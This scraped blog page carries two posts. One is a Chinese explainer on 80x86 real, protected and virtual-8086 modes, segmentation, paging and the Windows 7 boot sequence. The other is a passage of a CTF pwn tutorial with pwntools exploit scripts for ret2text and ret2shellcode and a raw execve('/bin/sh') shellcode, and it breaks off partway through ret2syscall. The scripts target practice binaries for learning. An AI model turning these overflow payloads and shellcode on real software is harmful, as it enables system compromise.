                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2020-02-26 08:58:38" itemprop="dateModified" datetime="2020-02-26T08:58:38-08:00">2020-02-26</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="80x86处理器的工作模式"><a href="#80x86处理器的工作模式" class="headerlink" title="80x86处理器的工作模式"></a>80x86处理器的工作模式</h2><p>80386以后的处理器有3种工作模式：实模式、保护模式和虚拟8086模式</p>
<p>其实，实模式和虚拟8086模式是为了向下兼容而设置的。而保护模式现代操作系统实际上的工作模式。只有在保护模式下，32位CPU的寻址才能达到4GB的地址空间，同时，也能实现多任务、内存分页管理和优先级保护等先进的机制</p>
<h2 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h2><p>处理器被复位或者加电的时候以实模式启动，这时候处理器中各寄存器以实模式的初始化值工作。80386处理器在实模式下的寄存器寻址方式和8086是一样的，由段寄存器的内容乘以16当做基地址，加上段内的偏移地址形成最终的物理地址，这时候它的32位地址只使用了低20位</p>
<p>在实模式下，80386处理器不能对内存进行分页管理，所以指令寻址的地址就是内存中实际的物理地址。在实模式下，所有的段都是可以读、写和执行的</p>
<p>实模式下80386不支持优先级，所有的指令相当于工作在特权级(优先级0)，所以它可以执行所有特权指令，包括读写控制寄存器CR0等</p>
<p>实际上，80386就是通过在实模式下初始化控制寄存器，GDTR、LDTR、IDTR与TR等管理寄存器以及页表，然后通过加载CR0使其中的保护模式使能位置位而进入保护模式的。当然，实模式下不支持硬件上的多任务切换</p>
<p>实模式下的中断处理方式和8086处理器相同，也用中断向量表来定位中断服务程序地址</p>
<p>中断向量表的结构也和8086处理器一样。每4个字节组成一个中断向量，其中包括两个字节的段地址和两个字节的偏移地址</p>
<p>80386实模式的最大的好处是可以使用80386的32位寄存器，还增加了两个辅助段寄存器FS和GS，使程序更加简洁，加快了执行速度。</p>
<h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><p>当80386工作在保护模式的时候，所有功能均可用。所有的32根地址线都可提供寻址，物理寻址空间高达4GB</p>
<p>在保护模式下，支持内存分页机制，提供了对虚拟内存的良好支持。虽然与8086可寻址的1MB物理地址空间相比，80386可寻址的物理地址空间非常大，但实际的微机系统不可能安装如此大的物理内存。所以，为了运行大型程序和真正实现多任务，虚拟内存是一种必需的技术</p>
<p>保护模式下80386支持多任务，可以依靠硬件仅在一条指令中实现任务切换。任务环境的保护工作是由处理器自动完成的</p>
<p>在保护模式下，80386处理器还支持优先级机制，不同的程序可以运行在不同的优先级上</p>
<p>优先级一共分0~3共4个级别，操作系统运行在最高的优先级0上，应用程序则运行在比较低的级别上</p>
<p>配合良好的检查及之后，既可以在任务间实现数据的安全共享也可以很好地隔离各个任务。从实模式切换到保护模式是通过修改控制寄存器CR0的控制位PE(位0)来实现的。在这之前还需要建立保护模式必需的一些数据表，如全局描述符表GDT和中断描述符表IDT等</p>
<p>DOS操作系统运行于实模式下，而WIndows操作系统运行于保护模式下</p>
<h2 id="虚拟8086模式"><a href="#虚拟8086模式" class="headerlink" title="虚拟8086模式"></a>虚拟8086模式</h2><p>虚拟8086模式是以任务形式在保护模式上执行的，在80386上可以同时支持由多个真正的80386任务和虚拟8086模式构成的任务</p>
<p>在虚拟8086模式下，80386支持任务切换和内存分页。在Windows操作系统中，有一部分程序专门用来管理虚拟8086模式的任务，称为虚拟8086管理程序</p>
<p>为了和8086程序的寻址方式兼容，虚拟8086模式采用和9096一样的寻址方式，即用段寄存器乘以16当做基址再配合偏移地址形成线性地址，寻址空间为1MB</p>
<p>但显然多个虚拟8086任务不能同时使用同一位置的1MB地址空间，否则会引起冲突。操作系统利用分页机制将不同虚拟8086任务的地址空间映射到不同的物理地址上去，这样每个8086任务看起来都认为自己在使用0~1MB的地址空间</p>
<p>8086代码中有相当一部分指令在保护模式下属于特权指令，如屏蔽中断的cli和中断返回指令iret等。这些指令在8086程序中是合法的。如果不让这些指令执行，8086代码就无法工作。虚拟8086管理程序采用模拟的方法来完成这些指令</p>
<p>虚拟8086管理程序在异常处理程序中检查产生异常的指令，如果是中断指令，则从虚拟8086任务的中断向量表中取出中断处理程序的入口地址，并将控制转移过去。如果是危及操作系统的指令，如cli等，则简单地忽略这些指令，在异常处理程序返回的时候直接返回到下一条指令</p>
<p>通过这些措施，8086程序既可以正常地运行下去，在执行这些指令的时候又察觉不到已经被虚拟8086管理程序做了手脚。</p>
<h2 id="DOS操作系统的内存安排"><a href="#DOS操作系统的内存安排" class="headerlink" title="DOS操作系统的内存安排"></a>DOS操作系统的内存安排</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/8086%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/QQ%E5%9B%BE%E7%89%8720200221093341.png" alt></p>
<p>8086处理器的寻址范围只有1MB，系统硬件使用的存储器地址安排在高地址内存</p>
<p>地址是从A0000h（即640KB）开始的384KB中，其中有用于显示的视频缓冲区和BIOS的地址空间</p>
<p>而在低地址内存，安排了中断向量表和BIOS数据区；剩下从500h开始到A0000h总共不到640KB的内存是操作系统和应用程序所能够使用的；应用程序不可能使用这640KB以外的内存。而即使在这640KB中，DOS操作系统又占领了低端的一部分内存，最后剩下600KB左右的内存才是应用程序真正可以用的</p>
<p>如果系统中有内存驻留程序存在，那么应用程序还要和这些TSR(Terminate and Stay Resident 内存驻留程序)程序共同分享这段内存空间</p>
<h2 id="80386的内存寻址机制"><a href="#80386的内存寻址机制" class="headerlink" title="80386的内存寻址机制"></a>80386的内存寻址机制</h2><h4 id="实模式-1"><a href="#实模式-1" class="headerlink" title="实模式"></a>实模式</h4><p>实模式下，一个完成的地址由段地址和偏移地址两部分组成。处理器换算时先将段地址乘以10h，得到段在物理内存中的起始地址，然后加上16位的偏移地址得到实际的物理地址</p>
<h4 id="保护模式和虚拟8086模式"><a href="#保护模式和虚拟8086模式" class="headerlink" title="保护模式和虚拟8086模式"></a>保护模式和虚拟8086模式</h4><p>当80386处理器工作在保护模式和虚拟8086模式的时候，可以使用全部32根地址线访问4GB大的内存。段地址加偏移地址的计算方法显然无法覆盖这么大的范围</p>
<p>但计算机一下就可以发现，实际上和8086同样的限制已经不复存在，因为80386所有的通用寄存器都是32位的，2的32次方就是4G，所以用任何一个通用寄存器来间接寻址，不必分段就已经可以访问到所有的内存地址</p>
<p>虽然在寻址上不再有分段的限制问题，但在保护模式下，一个地址空间是否可以被写入，可以被多少优先级的代码写入，就涉及保护的问题了。解决这些问题，必须对一个地址空间定义一些安全上的属性，可否就将这些属性存放在段寄存器中？</p>
<p>问题来了，涉及属性和保护模式下段的其他参数，要表示的信息太多了，要用64位长的数据才能表示。我们把这64位的属性数据叫做段描述符(Segment Descriptor)</p>
<p>80386的段寄存器依然是16位的，无法放下保护模式下64位的段描述符。需要把所有段的描述符按顺序放在内存中的指定位置，组成一个段描述符表(Descriptor Table)</p>
<p>而段寄存器中的16位用来做索引信息，指定这个段的属性用段描述符表中的第几个描述符来表示</p>
<p>这时段寄存器中的信息不再是段地址了，而是段选择器(Segment Selector)。可以通过它在段描述符表中选择一个项目以得到段的全部信息</p>
<p>80386中引入了两个全新的寄存器来管理段描述符表。一个是48位的全局描述符表寄存器GDTR，一个是16位的局部描述符表寄存器LDTR</p>
<p>实际上16位的段选择器中只有高13位表示索引值。剩下的3个数据位中，第0、1位表示程序的当前优先级RPL；第2位TI位用来表示在段描述符的位置；TI=0表示在GDT中，TI=1表示在LDT中</p>
<ul>
<li>在保护模式下，同样以xxxx:yyyyyyyy格式表示一个虚拟地址</li>
<li>注意，xxxx(16位，相当于8086时代的段地址)保存在段寄存器，yyyyyyyy（32位，相当于8086时代的偏移地址）保存在通用寄存器</li>
</ul>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/8086%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/QQ%E5%9B%BE%E7%89%8720200221104243.png" alt></p>
<h4 id="GDTR"><a href="#GDTR" class="headerlink" title="GDTR"></a>GDTR</h4><p>GDTR指向的描述符表为全局描述符表GDT(Global Descriptor Table)，它包含系统中所有任务都可用的段描述符，它包含系统中所有任务都可用的段描述符，通常包含描述符操作系统所使用的代码段、数据段和堆栈段的描述符及各任务的LDT段等；全局描述符表只有一个</p>
<h4 id="LDTR"><a href="#LDTR" class="headerlink" title="LDTR"></a>LDTR</h4><p>LDTR则指向局部描述符表LDT(Local Descriptor Table)。80386处理器设计成每个任务都有一个独立的LDT。它包含有每个任务私有的代码段、数据段和堆栈段的描述符，也包含该任务所使用的一些门描述符，如任务们和调用门描述符等</p>
<p>和GDTR直接指向内存地址不同，LDTR和CS、DS等段选择器一样只存放索引值，指向局部描述符表内存段对应的描述符在全局描述符表中的位置</p>
<p>随着任务的切换，只要改变LDTR的值，系统当前的局部描述符表LDT也随之切换，这样便于各项任务之间数据的隔离。但GDT并不随着任务的切换而切换</p>
<h2 id="80386的内存分页机制"><a href="#80386的内存分页机制" class="headerlink" title="80386的内存分页机制"></a>80386的内存分页机制</h2><p>在实模式下寻址的时候，“段寄存器+偏移地址”经过转换计算后得到的地址就是“物理地址”，也就是在物理内存中的实际地址</p>
<p>而保护模式下，“段寄存器+偏移地址”转换后的地址称为“线性地址”而不是“物理地址”。</p>
<h4 id="为什么会有内存分页机制？"><a href="#为什么会有内存分页机制？" class="headerlink" title="为什么会有内存分页机制？"></a>为什么会有内存分页机制？</h4><p>在单任务的DOS系统中，一个应用程序可以使用所有的空闲内存。程序退出后，操作系统回收所有的碎片内存并且合并成一个大块内存继续供下一个程序使用</p>
<p>内存合并过程中的一个极端情况是当系统中有多个TSR程序时，早装入内存的TSR被卸载后，后装入的TSR会留在内存的中间部位，把空闲内存隔成两个区域</p>
<p>这时应用程序使用的最大内存块只能是这两块内存中较大的一块，无法将它们合并使用</p>
<p>对于一个多任务的操作系统，内存的碎片化是不能容忍的。否则，经过一段时间后，即使空闲内存的总和很大，也可能出现任何一片内存都小到无法装入执行程序的地步，所以多任务操作系统中碎片内存的合并是个很重要的问题</p>
<h4 id="内存分页机制"><a href="#内存分页机制" class="headerlink" title="内存分页机制"></a>内存分页机制</h4><p>80386处理器的分页机制可以很好地解决这个问题。80386处理器把4KB大小的一块内存当做一“页”内存，每页物理内存可以根据“页目录”和“页表”，随意映射到不同的线性地址上。这样就可以将物理地址不连续的内存的映射连到一起</p>
<p>是否启用内存分页机制是由80386处理器新增的CR0寄存器中的位31（PG位）决定的，如果PG=0，则分页机制不启用，这时所有指令寻址的地址（线性地址）就是系统中实际的物理地址 。当PG=1的时候，80386处理器进入内存分页管理模式，所有的线性地址要经过页表的映射才得到最后的物理地址</p>
<p>不管在哪种模式下，所有寻址指令使用的都是线性地址，程序不用关心数据最后存放的物理内存</p>
<p>页表规定的不仅是地址的映射，同时还规定了页的访问属性，如是否可写、可读和可执行等。</p>
<p>页表可以指定一个页面并不真正映射到物理内存中。这样，访问这个页的指令会引发异常错误。这时，处理器会自动转移到页异常处理程序中去。操作系统可以在异常处理程序中将硬盘上的虚拟内存读到内存中并修改页表重新映射，然后重新执行引发异常的指令。利用这个机制可以在硬件层上支持虚拟内存的实现</p>
<h2 id="Windows的内存安排"><a href="#Windows的内存安排" class="headerlink" title="Windows的内存安排"></a>Windows的内存安排</h2><h3 id="虚拟内存安排"><a href="#虚拟内存安排" class="headerlink" title="虚拟内存安排"></a>虚拟内存安排</h3><p>Windows系统一般在硬盘上建立大小为物理内存两倍左右的交换文件用作虚拟内存</p>
<p>利用80386处理器的内存分页机制，交换文件的寻址上可以很方便地作为物理内存。只需要在真正调用的时候将其读入物理内存并同时修改线性地址映射到这块内存即可。同样道理，因为只是映射一个地址，所以被执行的程序也可以不必装入内存，只需要在页表种建立映射关系，真正运行到这段代码才调入内存</p>
<p>Windows是一个分时的多任务操作系统，CPU时间被分成一个个的时间片后分配给不同程序轮流使用。在A程序的时间片种，和这个程序执行无关的部分（B和C等其他程序的代码和数据）并不需要映射到线性地址中</p>
<blockquote>
<p>CPU只能看到线性地址（假的），每个程序拥有自己的线性地址（DLL除外）</p>
</blockquote>
<h3 id="WIN32编程中的重要概念"><a href="#WIN32编程中的重要概念" class="headerlink" title="WIN32编程中的重要概念"></a>WIN32编程中的重要概念</h3><ul>
<li>每个应用程序都有自己的4GB的寻址空间，该空间可存放操作系统、系统DLL和用户DLL的代码，它们之中有各种函数供应用程序调用。再除去其它的一些空间，余下的是应用程序的代码、数据和可以分配的地址空间</li>
<li>不同应用程序的线性地址空间是隔离的，虽然它们在物理内存种同时存在，但在某个程序所属的时间片中，其他应用程序的代码和数据没有被映射到可寻址的线性地址中，所以是不可访问的。所以从编程的角度来看，程序可以使用私有的4GB寻址空间</li>
<li>DLL程序没有自己的私有空间，它们总是被映射到其它应用程序的地址空间中，当做其它应用程序的一部分运行。是为了其它程序调用</li>
</ul>
<h3 id="从WIN32汇编的角度看内存寻址"><a href="#从WIN32汇编的角度看内存寻址" class="headerlink" title="从WIN32汇编的角度看内存寻址"></a>从WIN32汇编的角度看内存寻址</h3><p>如果把描述符表以及页表等内容交给用户程序管理是很不安全的。任何权限上开放引发的安全问题都是很严重的，如Windows9X中的中断描述符表是可写的，CIH病毒可利用它将自己的权限</p>
<p>Windows为用户程序的代码段、数据段和堆栈段全部预定义好了段描述符。这些段的起始地址为0，限长为ffffffff，所以用它们可以直接寻址全部的4GB地址空间</p>
<p>程序开始执行的时候，CS，DS，ES和SS都已经指向了正确的描述符，在整个程序的生命周期内，程序员不必改动这些段寄存器，也不必关心它们的值究竟是多少（也无法更改），所以整个程序可以不用出现段寄存器的身影</p>
<h2 id="实模式下的中断或异常处理"><a href="#实模式下的中断或异常处理" class="headerlink" title="实模式下的中断或异常处理"></a>实模式下的中断或异常处理</h2><p>实模式下的中断和异常服务程序地址存放在中断向量表中</p>
<p>中断向量表位于物理内存中，每个中断向量表是一个xxxxx:yyyy格式的地址，占用4字节</p>
<p>当发生n号异常或n号中断，或者执行到int n指令的时候，CPU首先到内存nx4的地方去取出服务程序的地址aaaa:bbbb</p>
<p>然后将标志寄存器、中断时的CS和IP压入堆栈，接着转移到aaaa:bbbb处执行</p>
<h2 id="保护模式下的中断或异常处理"><a href="#保护模式下的中断或异常处理" class="headerlink" title="保护模式下的中断或异常处理"></a>保护模式下的中断或异常处理</h2><p>保护模式下，中断或异常处理往往从用户代码切换到操作系统代码中执行。由于保护模式下的代码有优先级之分，因此出现了从优先级低的应用程序转移到优先级高的系统代码中的问题，如果优先级低的代码能够任意调用优先级高的代码，就相当于拥有了高优先级代码的权限。为了使高优先级的代码能够安全地被低优先级的代码调用，保护模式下增加了“门”的概念</p>
<p>“门”指向某个优先级高的程序所规定的入口点，所有优先级低的程序调用优先级高的程序只能通过门重定向，进入门所规定的入口点。这样可以避免低级别的代码从任意位置进入优先级高的程序的问题。保护模式下的中断和异常等服务程序也要从“门”进入，80386的门分为中断门、自陷门和任务门几种</p>
<p>保护模式下把所有的中断描述符放在一起组成“中断描述表IDT”。为此80386处理器引入了一个新的48位寄存器IDTR。IDTR的高32位指定了IDT在内存中的基址（线性地址），低16位指定了IDT的长度，相当于指定了可以支持的中断数量</p>
<p>保护模式下发生异常或中断时，处理器先根据IDTR寄存器得到中断描述符的地址，然后取出n号中断/异常的门描述符，再从描述符中得到中断服务程序的地址xxxx:yyyy，经过段地址转换后得到服务程序的32位线性地址并转移后执行</p>
<p>在Windows中，操作系统使用动态链接库来代替中断服务程序提供系统功能，所以Win32汇编中int指令也就失去了存在的意义。其实那些调用API的指令原本是用int指令实现的</p>
<h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><h3 id="段的类型检查"><a href="#段的类型检查" class="headerlink" title="段的类型检查"></a>段的类型检查</h3><p>段的类型是由断描述符指定的，主要属性有是否可执行，是否可读和是否可写等</p>
<p>CS、DS和SS等段选择器是否能装入某种类型的段描述符是有限制的。如不可执行的段不能装入CS；不可读的段不能装入DS与ES等数据段寄存器；不可写的段不能装入SS等</p>
<p>如果段类型检查通不过，则处理器会产生一般性保护异常或堆栈异常</p>
<h3 id="页的类型检查"><a href="#页的类型检查" class="headerlink" title="页的类型检查"></a>页的类型检查</h3><p>除了可以在段级别上指定整个段是否可读写外，在页表中也可以为每个页指定是否可写</p>
<p>对于特权级下的执行代码，所有的页都是可写的</p>
<p>但对于1、2和3级的代码，还要根据页表中的R/W项决定是否可写，企图对只读的页进行写操作会产生页异常</p>
<h3 id="访问数据时的级别检查"><a href="#访问数据时的级别检查" class="headerlink" title="访问数据时的级别检查"></a>访问数据时的级别检查</h3><p>优先级低的代码不能访问优先级高的数据段。80386的段描述符中有一个DPL域（描述符优先级），表示这个段可以被访问的最低优先级</p>
<p>而段选择器中含有RPL域（请求优先级），表示当前执行代码的优先级</p>
<p>只有DPL数值上大于或等于RPL值的时候，该段才是可以访问的，否则会产生一般性保护异常</p>
<h3 id="控制转移的检查"><a href="#控制转移的检查" class="headerlink" title="控制转移的检查"></a>控制转移的检查</h3><p>在处理中，有很多指令可以实现控制转移，如jmp、call、ret、int和iret等指令</p>
<p>但优先级低的代码不能随意转移到优先级高的代码中，所以遇到这些指令的时候，处理器要检查转移的目的位置是否合法</p>
<h3 id="指令集的检查"><a href="#指令集的检查" class="headerlink" title="指令集的检查"></a>指令集的检查</h3><p>有两类指令可以影响保护机制</p>
<p>第一类是改变GDT、LDT、IDT以及控制寄存器等关键寄存器的指令，称为特权指令</p>
<p>第二类是操作I/O端口的指令以及cli和sti等改变中断允许的指令，称为敏感指令</p>
<p>特权指令只能在优先级0上才能运行，而敏感指令取决于eflags寄存器中的IOPL位。只有IOPL位表示的优先级高于等于当前代码段的优先级时，指令才能执行</p>
<h3 id="I-O操作的保护"><a href="#I-O操作的保护" class="headerlink" title="I/O操作的保护"></a>I/O操作的保护</h3><p>I/O地址也是受保护的对象。因为通过I/O操作可以绕过系统对很多硬件进行控制</p>
<p>80386可以单独位I/O空间提供保护，每个任务有个TSS（任务状态段）来记录任务切换的信息</p>
<p>TSS中有个I/O允许位图，用来表示对应的I/O端口是否可以操作</p>
<h2 id="Windows7的启动过程"><a href="#Windows7的启动过程" class="headerlink" title="Windows7的启动过程"></a>Windows7的启动过程</h2><h3 id="开启电源"><a href="#开启电源" class="headerlink" title="开启电源"></a>开启电源</h3><p>计算系统将会进行加电自检(POST)。如果通过，之后BIOS会读取主引导记录(MBR：被标记为启动设备的硬盘的首扇区)，并传送被Windows7建立的控制编码给MBR</p>
<blockquote>
<p>注：硬盘的0磁道的第一个扇区称为MBR，它的大小是512字节，而这个区域可以分为两个部分。第一部分为pre-boot区（预启动区），占446字节；第二部分是Partition Table区（分区表），占66个字节，该区域相当于一个小程序，作用是判断哪个分区被标记为活动分区，然后去读取那个分区的启动区，并运行该区种的代码</p>
</blockquote>
<p>MBR他是不属于任何一个操作系统，也不能用操作系统提供的磁盘操作命令来读取它。但我们可以用ROM-BIOS种提供的INT 13H中断的2号功能读出该扇区的内容</p>
<h3 id="启动菜单生成"><a href="#启动菜单生成" class="headerlink" title="启动菜单生成"></a>启动菜单生成</h3><p>Windows启动管理器读取”启动配置数据存储”(Boot Confi guration Data store)中的信息。此信息包含已经被安装在计算机上的所有操作系统的配置信息。并且用以生成启动菜单</p>
<p>当你在启动菜单中选择下列动作时：</p>
<ul>
<li>如果选择的是Window7，Windows启动管理器(Windows Boot Manager)运行<code>%SystemRoot%\System32</code>文件夹中的<code>OS Loader——Winload.exe</code></li>
<li>如果选择的是自休眠状态恢复Windows7，那么启动管理器将装载<code>Winresume.exe</code>并恢复先前的使用环境</li>
<li>如果选择的是早期版本的Windows，启动管理器将定位系统安装所在的卷，并且加载Windows NT风格的早期OS loader(Ntldr.exe)，生成一个由boot.ini内容决定的启动菜单</li>
</ul>
<h3 id="核心文件加载及登录"><a href="#核心文件加载及登录" class="headerlink" title="核心文件加载及登录"></a>核心文件加载及登录</h3><p>Windows7启动时，加载其核心文件Ntoskrnl.exe和hal.dll，从注册表中读取设置并加载驱动程序</p>
<p>接下来将运行Windows会话管理器(smss.exe)并且启动Windows启动程序(Wininit.exe)，本地安全验证(Lsass.exe)与服务(Services.exe)进程，完成后就可以登录系统</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/16/pwn╚δ├┼ú¿Basic-ROPú⌐/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/16/pwn╚δ├┼ú¿Basic-ROPú⌐/" class="post-title-link" itemprop="url">pwn入门（Basic-ROP）</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-16 07:41:26 / Geändert am: 23:42:50" itemprop="dateCreated datePublished" datetime="2020-02-16T07:41:26-08:00">2020-02-16</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>转载自：<a href="https://www.yuque.com/hxfqg9/hs80y0/ug9gx5#ueOeL" target="_blank" rel="noopener">https://www.yuque.com/hxfqg9/hs80y0/ug9gx5#ueOeL</a></p>
<h1 id="Basic-ROP"><a href="#Basic-ROP" class="headerlink" title="Basic-ROP"></a>Basic-ROP</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>没啥好说的，看过蒸米的就可以做出来了</p>
<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./ret2text&apos;)</span><br><span class="line">sys_addr=0x804863A</span><br><span class="line">payload=&apos;a&apos;*112+p32(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>通过有一个复制的函数，会复制到 buf2 这个地方</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574162875314-6f04e478-d8ce-4975-b1d7-502907400056.png" alt="image.png"></p>
<p>而且 buf2 所在的是 bss 段</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574162983275-2c3a0d0b-dad5-4f15-a5d8-8e219efa3c7c.png" alt="image.png"></p>
<p>通过 gdb 查看 bss 段可执行，所以把只要把内容写到这个地方，然后返回地址跳转到 bss 段就可以执行 shellcode</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574163235157-20066c3b-fd85-44dd-afb4-59ec9d47ab72.png" alt="image.png"></p>
<p>掌握了一些 pwntools 的用法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">print</span> shellcraft.sh()</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">'A'</span>) + p32(buf2_addr))</span><br><span class="line"><span class="keyword">print</span> shellcode.ljust(<span class="number">112</span>,<span class="string">'A'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>上面是给出的 exp 等价于下面的，可以发现 shellcraft.sh() 可以生成 shellcode</p>
<p>shellcode.ljust(112,’a’) 可以控制垃圾数据与 shellcode 合起来的长度为112</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(&apos;./ret2shellcode&apos;)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode+=&apos;a&apos;*(112-len(shellcode))</span><br><span class="line">print shellcode</span><br><span class="line">buf2_addr = 0x804a080</span><br><span class="line">sh.sendline(shellcode + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="sniperoj-pwn100-shellcode-x86-64："><a href="#sniperoj-pwn100-shellcode-x86-64：" class="headerlink" title="sniperoj-pwn100-shellcode-x86-64："></a>sniperoj-pwn100-shellcode-x86-64：</h2><p>23字节shellcode</p>
<p>“\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p>
<p>首先根据 gdb 确定偏移，然后把因为有个 leave 指令会破坏前面的，所以前面的填充为脏数据，然后加上返回地址占据的 8 位空间，确定在 buf_addr 后面 24+8 填充 shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&apos;./shellcode&apos;)</span><br><span class="line">shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br><span class="line">sh.recvuntil(&apos;[&apos;)</span><br><span class="line">buf_addr = sh.recvuntil(&apos;]&apos;, drop=True)</span><br><span class="line">buf_addr = int(buf_addr, 16)</span><br><span class="line">payload = &apos;b&apos; * 24 + p64(buf_addr + 32) + shellcode_x64</span><br><span class="line">print payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>ret2syscall 即控制程序执行系统调用来获取 shell</p>
<p>关于系统调用的知识：</p>
<blockquote>
<p><strong>Linux 的系统调用通过 int 80h 实现</strong>，用系统调用号来区分入口函数</p>
<p><strong>应用程序调用系统调用的过程是：</strong></p>
<p>1、把<strong>系统调用的编号存入 EAX</strong></p>
<p>2、把<strong>函数参数存入其它通用寄存器</strong></p>
<p>3、<strong>触发 0x80 号中断</strong>（int 0x80）</p>
</blockquote>
<p>那么我们如果希望通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 就可以了</p>
<p>如果说想通过系统调用执行的是：<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>（32位程序）</p>
<p>那么 eax 寄存器应该放系统调用号，查看 execve 的系统调用号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/asm/unistd_32.h | grep execve</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574326114023-1a1a7dd8-3b3b-4b26-b267-8ab853fc7a6e.png" alt="image.png"></p>
<p>得到 11，转换为 16 进制是 0xb，所以 eax 中应该存放 0xb</p>
<p>ebx 应该存放想要执行的 /bin/sh 的地址，还有两个参数设置为 0</p>
<p>所以现在需要做的就是让：</p>
<blockquote>
<p>eax=0xb</p>
<p>ebx=/bin/sh 的地址</p>
<p>ecx=0</p>
<p>edx=0</p>
</blockquote>
<p>只需要让栈顶的值是 0xb 然后可以通过 pop eax 达到目的</p>
<p>要用：<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a> 来查找</p>
<p>使用命令找到 pop eax：<code>ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335064586-620aa890-57e1-4427-8846-51990871c55c.png" alt="image.png"></p>
<p>类似的，通过这条命令寻找控制其他寄存器的地址，找到可以控制多个的！</p>
<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335389884-7affaef4-c92f-49e7-b6d6-c9ce091d9732.png" alt="image.png"></p>
<p>同时使用：<code>ROPgadget --binary rop --string &#39;/bin/sh&#39;</code> 找到 ‘/bin/sh’ 字符串在什么地方</p>
